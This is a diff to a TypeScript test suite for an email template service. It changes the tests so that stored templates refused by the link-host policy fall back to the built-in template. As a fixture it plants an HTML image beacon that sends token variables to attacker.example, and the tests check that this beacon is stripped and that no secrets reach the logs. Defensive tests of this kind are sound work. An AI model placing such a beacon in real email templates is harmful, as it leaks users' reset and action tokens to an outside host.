@@ -13,6 +13,9 @@ import { DEFAULT_EMAIL_TEMPLATES } from '../email/templates.js';
 import { TEMPLATE_LINK_HOSTS_SETTING } from '../email/template-links.js';
 import { buildTestApp, TEST_PASSWORD, type TestApp, type TestSession } from './helpers.js';
 
+const FALLBACK_WARNING =
+  'Stored email template refused by the link policy; sending the built-in template';
+
 describe('email template token boundaries', () => {
   let harness: TestApp;
   let founder: TestSession;
@@ -382,7 +385,7 @@ describe('email template destination boundaries', () => {
     assert.equal(mail.text, 'Continue: https://portal.test/reset-password?token=reset-secret\n');
   });
 
-  it('refuses legacy beacons before queueing and warns without logging the token', async () => {
+  it('falls back to the built-in template for a legacy beacon template', async () => {
     const warning = mock.method(harness.app.log, 'warn');
     try {
       for (const [key, variable] of [
@@ -394,34 +397,39 @@ describe('email template destination boundaries', () => {
           body_html: `<img src="https://attacker.example/?u={{${variable}}}">`,
         });
         harness.mailbox.clear();
-        await assert.rejects(
-          harness.services.email.enqueue({
-            to: founder.user.email,
-            templateKey: key,
-            vars: { [variable]: 'https://portal.test/action?token=secret-must-not-be-logged' },
-          }),
-          /body_html.*NEXUS_EMAIL_TEMPLATE_ALLOWED_LINK_HOSTS/,
+        const { created } = await harness.services.email.enqueue({
+          to: founder.user.email,
+          templateKey: key,
+          vars: { [variable]: 'https://portal.test/action?token=secret-must-not-be-logged' },
+          idempotencyKey: `legacy-beacon:${key}`,
+        });
+        assert.equal(created, true);
+        assert.equal((await harness.tick()).claimed, 1);
+        const mail = harness.mailbox.sent.at(-1);
+        assert.ok(mail, 'the built-in template must still be delivered');
+        assert.ok(!mail.html.includes('attacker.example'));
+        assert.ok(
+          mail.html.includes('href="https://portal.test/action?token=secret-must-not-be-logged"'),
         );
-        assert.equal((await harness.tick()).claimed, 0);
-        assert.equal(harness.mailbox.sent.length, 0);
       }
+      harness.mailbox.clear();
       const requested = await harness.app.inject({
         method: 'POST',
         url: '/api/auth/forgot-password',
         payload: { email: founder.user.email },
       });
       assert.equal(requested.statusCode, 200, requested.body);
-      assert.equal((await harness.tick()).claimed, 0);
+      assert.equal((await harness.tick()).claimed, 1);
+      assert.ok(!harness.mailbox.sent.at(-1)?.html.includes('attacker.example'));
       const calls = warning.mock.calls.map((call) => call.arguments);
-      assert.ok(calls.some((args) => args[1] === 'Refused unsafe email template'));
-      assert.ok(calls.some((args) => args[1] === 'Could not queue a single-use link email'));
+      assert.ok(calls.some((args) => args[1] === FALLBACK_WARNING));
       assert.ok(!JSON.stringify(calls).includes('secret-must-not-be-logged'));
     } finally {
       warning.mock.restore();
     }
   });
 
-  it('rechecks interpolated URL variables and operator policy on every render', async () => {
+  it('rechecks interpolated variables and falls back for a refused stored template', async () => {
     await harness.store.emailTemplates.upsert('password_reset', {
       ...safe,
       body_html: '<a href="{{portal_url}}">Portal</a>',
@@ -435,9 +443,15 @@ describe('email template destination boundaries', () => {
       body_html: '<img src="https://assets.example.test/logo.png">',
     });
     harness.config.emailTemplateAllowedLinkHosts = [];
-    await assert.rejects(
-      harness.services.email.render('password_reset'),
-      /host 'assets.example.test'/,
-    );
+    const warning = mock.method(harness.app.log, 'warn');
+    try {
+      const fallback = await harness.services.email.render('password_reset');
+      assert.ok(!fallback.html.includes('assets.example.test'));
+      assert.ok(fallback.html.includes('Set a new password'));
+      const calls = warning.mock.calls.map((call) => call.arguments);
+      assert.ok(calls.some((args) => args[1] === FALLBACK_WARNING));
+    } finally {
+      warning.mock.restore();
+    }
   });
 });
